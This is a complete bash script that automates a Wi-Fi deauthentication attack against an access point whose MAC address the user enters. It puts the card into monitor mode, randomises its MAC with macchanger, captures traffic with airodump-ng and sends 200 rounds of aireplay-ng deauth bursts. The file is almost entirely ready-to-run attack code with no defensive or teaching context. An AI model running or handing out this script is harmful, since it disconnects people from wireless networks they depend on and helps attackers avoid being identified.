#!/bin/bash

set -e  # Exit immediately if a command exits with a non-zero status

# Function to clean up and exit
cleanup() {
    echo "Cleaning up..."
    airmon-ng stop wlan0mon &>/dev/null || true
    service network-manager restart &>/dev/null || true
    exit
}

# Set trap to call cleanup function on script exit
trap cleanup EXIT

# Function to run a command with timeout and error handling
run_command() {
    timeout 30s "$@" || { echo "Error: Command '$*' failed or timed out"; return 1; }
}

# Check if script is run as root
if [[ $EUID -ne 0 ]]; then
    echo "This script must be run as root"
    exit 1
fi

# Prompt for target MAC address
read -p "Enter the target MAC address: " TARGET_MAC

# Validate MAC address format
if ! [[ $TARGET_MAC =~ ^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$ ]]; then
    echo "Invalid MAC address format. Please use XX:XX:XX:XX:XX:XX"
    exit 1
fi

# Start monitor mode
run_command airmon-ng start wlan0
sleep 7

# Configure interface
run_command ifconfig wlan0mon down
sleep 1
run_command macchanger -r wlan0mon
sleep 2
run_command ifconfig wlan0mon up

# Start packet capture
run_command airodump-ng wlan0mon -c 6 &
AIRODUMP_PID=$!

# Deauth loop
for i in {1..200}; do
    run_command aireplay-ng --deauth 5 -a "$TARGET_MAC" wlan0mon
    sleep 5
done

# Kill airodump-ng
kill $AIRODUMP_PID

# Cleanup is handled by the trap
